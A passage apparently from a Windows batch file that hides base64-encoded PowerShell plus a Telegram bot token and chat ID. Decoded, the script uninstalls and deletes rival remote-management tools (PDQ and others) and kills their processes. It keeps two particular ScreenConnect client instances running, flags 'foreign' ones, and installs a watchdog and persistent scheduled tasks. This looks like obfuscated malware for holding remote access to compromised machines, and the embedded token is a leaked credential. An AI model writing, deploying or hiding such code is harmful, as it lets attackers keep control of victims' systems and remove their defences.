IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQRFEiKTsgUHJvZD1AKCdQRFEgRGVwbG95KicsJ1BE
USBJbnZlbnRvcnkqJywnUERRIENvbm5lY3QqJykgfQogICAgKQoKICAgIGZvcmVhY2ggKCR0b29s
IGluICRybW0pIHsKICAgICAgICAkaGl0ID0gJGZhbHNlCiAgICAgICAgZm9yZWFjaCAoJHBhdCBp
biAkdG9vbC5Qcm9kKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5p
bnN0YWxsUm9vdHMpIHsKICAgICAgICAgICAgICAgIEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAg
ICAgICAgJGRuID0gKEdldC1JdGVtUHJvcGVydHkgJF8uUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAgICAgICAgICAgIGlmICgkZG4gLWFu
ZCAkZG4gLWxpa2UgJHBhdCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSXMtRGF0dG9L
ZWVwZXIgJGRuKSB7IExvZyAicm1tX3NraXBfZGF0dG9fa2VlcCBbJGRuXSI7IHJldHVybiB9CiAg
ICAgICAgICAgICAgICAgICAgICAgIGlmIChVbmluc3RhbGwtUHJvZHVjdEtleSAkXykgeyAkbi5y
bW0rKzsgJGhpdCA9ICR0cnVlIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAg
ICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkdG9v
bC5TdmMpIHsKICAgICAgICAgICAgR2V0LVNlcnZpY2UgLU5hbWUgJHBhdCAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmIChJ
cy1EYXR0b0tlZXBlciAkXy5OYW1lIC1vciBJcy1EYXR0b0tlZXBlciAkXy5EaXNwbGF5TmFtZSkg
eyBMb2cgInJtbV9za2lwX2RhdHRvX3N2YyAkKCRfLk5hbWUpIjsgcmV0dXJuIH0KICAgICAgICAg
ICAgICAgICYgc2MuZXhlIHN0b3AgIiQoJF8uTmFtZSkiIDI+JjEgfCBPdXQtTnVsbAogICAgICAg
ICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA1MDAKICAgICAgICAgICAgICAgICYg
c2MuZXhlIGRlbGV0ZSAiJCgkXy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgICAg
ICAkbi5ybW0rKzsgJGhpdCA9ICR0cnVlOyBMb2cgInJtbV9zdmNfZGVsZXRlZCAkKCRfLk5hbWUp
IFskKCR0b29sLlRhZyldIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZvcmVhY2gg
KCRwYXQgaW4gJHRvb2wuUHJvYykgewogICAgICAgICAgICBHZXQtUHJvY2VzcyAtTmFtZSAkcGF0
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAg
ICAgICAgICAgU3RvcC1Qcm9jZXNzIC1JZCAkXy5JZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUKICAgICAgICAgICAgICAgICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExvZyAi
cm1tX3Byb2Nfa2lsbGVkICQoJF8uUHJvY2Vzc05hbWUpIFskKCR0b29sLlRhZyldIgogICAgICAg
ICAgICB9CiAgICAgICAgfQogICAgICAgIGZvcmVhY2ggKCRkIGluICR0b29sLkRpcnMpIHsKICAg
ICAgICAgICAgaWYgKCRkIC1hbmQgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7CiAgICAg
ICAgICAgICAgICBpZiAoSXMtRGF0dG9LZWVwZXIgJGQpIHsgTG9nICJybW1fc2tpcF9kYXR0b19k
aXIgJGQiOyBjb250aW51ZSB9CiAgICAgICAgICAgICAgICBpZiAoRm9yY2UtUmVtb3ZlRGlyICRk
KSB7ICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX2Rpcl9yZW1vdmVkICRkIiB9CiAg
ICAgICAgICAgICAgICBlbHNlIHsgJG4uZmFpbCsrOyBMb2cgInJtbV9kaXJfUkVNT1ZFX0ZBSUxF
RCAkZCIgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkaGl0KSB7IExvZyAi
cm1tX2V4dGVybWluYXRlZCAkKCR0b29sLlRhZykiIH0KICAgIH0KCiAgICAkc3VtbWFyeSA9ICJl
eHRlcm1pbmF0ZSBzdmM9JCgkbi5zdmMpIHByb2M9JCgkbi5wcm9jKSBkaXI9JCgkbi5kaXIpIHBy
b2R1Y3Q9JCgkbi5wcm9kdWN0KSBybW09JCgkbi5ybW0pIGZhaWw9JCgkbi5mYWlsKSIKICAgIExv
ZyAkc3VtbWFyeQogICAgcmV0dXJuICRzdW1tYXJ5Cn0KCmZ1bmN0aW9uIFVwZGF0ZS1TdGF0ZSB7
CiAgICAkcHJpbSA9ICRudWxsOyAkYWx0ID0gJG51bGwKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdl
dC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConKSkgewogICAgICAgIGlmICgk
c3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCknKSB7CiAgICAgICAgICAgIGlmICgk
bWF0Y2hlc1sxXSAtZXEgJzVmNjAxMDU3OTg1MmU1MDcnKSB7ICRwcmltID0gIiQoJHN2Yy5TdGF0
dXMpIiB9CiAgICAgICAgICAgIGVsc2VpZiAoJG1hdGNoZXNbMV0gLWVxICdmODYxYzgxNDBkNDUz
NDI3JykgeyAkYWx0ID0gIiQoJHN2Yy5TdGF0dXMpIiB9CiAgICAgICAgfQogICAgfQogICAgJGZv
cmVpZ24gPSBAKCkKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdTY3Jl
ZW5Db25uZWN0IENsaWVudConKSkgewogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdcKChb
MC05YS1mXXsxNn0pXCknIC1hbmQgJG1hdGNoZXNbMV0gLW5vdGluIEAoJzVmNjAxMDU3OTg1MmU1
MDcnLCdmODYxYzgxNDBkNDUzNDI3JykpIHsKICAgICAgICAgICAgJGZvcmVpZ24gKz0gJG1hdGNo
ZXNbMV0KICAgICAgICB9CiAgICB9CiAgICAkaWQgPSBSZWFkLUlkZW50aXR5CiAgICAkdGFza3NP
ayA9IDA7ICR0YXNrc1RvdGFsID0gMAogICAgZm9yZWFjaCAoJGsgaW4gJ1RBU0tfQScsJ1RBU0tf
QicsJ1RBU0tfQycsJ1RBU0tfRCcpIHsKICAgICAgICAkdGFza3NUb3RhbCsrCiAgICAgICAgJHRu
ID0gW3N0cmluZ10kaWRbJGtdCiAgICAgICAgaWYgKC1ub3QgJHRuKSB7IGNvbnRpbnVlIH0KICAg
ICAgICAkbWFya2VyID0gaWYgKCRrIC1lcSAnVEFTS19CJykgeyAnZXRsX21vbi5jbWQnIH0gZWxz
ZSB7ICdvd25fbW9uLmNtZCcgfQogICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0biAkbWFy
a2VyKSB7ICR0YXNrc09rKysgfQogICAgfQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgJE1vblBh
dGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ293bl9tb24uY21kJyB9CiAgICAkd2QgPSBFbnN1cmUt
V2F0Y2hkb2cKICAgICRwcmV2ID0gQHt9CiAgICAkc3RhdGVQYXRoID0gSm9pbi1QYXRoICRXb3Jr
RGlyICdzdGF0ZS5qc29uJwogICAgaWYgKFRlc3QtUGF0aCAkc3RhdGVQYXRoKSB7CiAgICAgICAg
dHJ5IHsgKEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoIC1SYXcgfCBDb252ZXJ0
RnJvbS1Kc29uKS5QU09iamVjdC5Qcm9wZXJ0aWVzIHwgRm9yRWFjaC1PYmplY3QgeyAkcHJldlsk
Xy5OYW1lXSA9ICRfLlZhbHVlIH0gfSBjYXRjaCB7fQogICAgfQogICAgJGluc3RhbGxDb3VudCA9
IDEKICAgIGlmICgkcHJldi5pbnN0YWxsQ291bnQpIHsgJGluc3RhbGxDb3VudCA9IFtpbnRdJHBy
ZXYuaW5zdGFsbENvdW50IH0KICAgIGlmICgkcHJldi5wcmltIC1hbmQgJHByZXYucHJpbSAtbmUg
J1J1bm5pbmcnIC1hbmQgJHByaW0gLWVxICdSdW5uaW5nJykgeyAkaW5zdGFsbENvdW50KysgfQog
ICAgJHN0YXRlID0gW29yZGVyZWRdQHsKICAgICAgICBob3N0ICAgICAgICAgPSAkZW52OkNPTVBV
VEVSTkFNRQogICAgICAgIHRzICAgICAgICAgICA9IChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1l
KCkuVG9TdHJpbmcoJ28nKQogICAgICAgIGJ1aWxkICAgICAgICA9ICRCdWlsZAogICAgICAgIHBy
aW0gICAgICAgICA9ICQoaWYgKCRwcmltKSB7ICRwcmltIH0gZWxzZSB7ICdNSVNTSU5HJyB9KQog
ICAgICAgIGFsdCAgICAgICAgICA9ICQoaWYgKCRhbHQpIHsgJGFsdCB9IGVsc2UgeyAnTUlTU0lO
RycgfSkKICAgICAgICBmb3JlaWduICAgICAgPSAkZm9yZWlnbgogICAgICAgIHRhc2tzT2sgICAg
ICA9ICR0YXNrc09rCiAgICAgICAgdGFza3NUb3RhbCAgID0gJHRhc2tzVG90YWwKICAgICAgICB3
YXRjaGRvZyAgICAgPSAkd2QKICAgICAgICBpbnN0YWxsQ291bnQgPSAkaW5zdGFsbENvdW50CiAg
ICAgICAgbGFzdEhlYWwgICAgID0gJChpZiAoJEV4dHJhKSB7IChHZXQtRGF0ZSkuVG9Vbml2ZXJz
YWxUaW1lKCkuVG9TdHJpbmcoJ28nKSB9IGVsc2VpZiAoJHByZXYubGFzdEhlYWwpIHsgJHByZXYu
bGFzdEhlYWwgfSBlbHNlIHsgJG51bGwgfSkKICAgICAgICBub3RlICAgICAgICAgPSAkRXh0cmEK
ICAgIH0KICAgICgkc3RhdGUgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MpIHwgU2V0LUNvbnRl
bnQgLUxpdGVyYWxQYXRoICRzdGF0ZVBhdGggLUZvcmNlCiAgICByZXR1cm4gJHN0YXRlCn0KCnN3
aXRjaCAoJEFjdGlvbikgewogICAgJ2luaXQnICAgICAgICAgICAgeyAkaWQgPSBJbml0aWFsaXpl
LUlkZW50aXR5OyAkaWQuR2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3QgeyAiJCgkXy5L
ZXkpPSQoJF8uVmFsdWUpIiB9IH0KICAgICdpZGVudGl0eScgICAgICAgIHsgJGlkID0gUmVhZC1J
ZGVudGl0eTsgJGlkLkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8uS2V5
KT0kKCRfLlZhbHVlKSIgfSB9CiAgICAnd2F0Y2hkb2cnICAgICAgICB7IEluc3RhbGwtV2F0Y2hk
b2cgfCBPdXQtTnVsbCB9CiAgICAnd2F0Y2hkb2ctZW5zdXJlJyB7IEVuc3VyZS1XYXRjaGRvZyB9
CiAgICAndGFza3MtZW5zdXJlJyAgICB7IEVuc3VyZS1QZXJzaXN0VGFza3MgfQogICAgJ3N0YXRl
JyAgICAgICAgICAgeyBVcGRhdGUtU3RhdGUgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MgfQog
ICAgJ3JlcGFpcicgICAgICAgICAgeyBSZXBhaXItU0NTZXJ2aWNlICRGcCB9CiAgICAncmVnaXN0
ZXJlZCcgICAgICB7IFRlc3QtU0NSZWdpc3RlcmVkICRGcCB9CiAgICAnZXh0ZXJtaW5hdGUnICAg
ICB7IEludm9rZS1FeHRlcm1pbmF0ZSB9Cn0K
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcN
CkNIQVRfSUQ9NzU0NzQ2MjA3MA0K
::B64_NTF_END
